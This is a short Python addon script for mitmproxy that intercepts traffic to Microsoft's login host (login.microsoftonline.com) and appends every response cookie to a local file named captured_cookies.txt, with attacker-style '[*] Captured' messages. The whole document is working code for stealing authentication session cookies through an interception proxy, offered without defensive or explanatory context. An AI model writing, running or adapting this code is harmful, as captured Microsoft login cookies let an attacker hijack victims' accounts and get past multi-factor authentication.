from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if "login.microsoftonline.com" in flow.request.pretty_host:
        with open("captured_cookies.txt", "a") as f:
            f.write(f"[*] Captured response cookies for {flow.request.pretty_host}:\n")
            for cookie in flow.response.cookies:
                f.write(f"{cookie}: {flow.response.cookies[cookie]}\n")

# Start mitmproxy with this script
print("[*] Starting mitmproxy with cookie extraction script...")
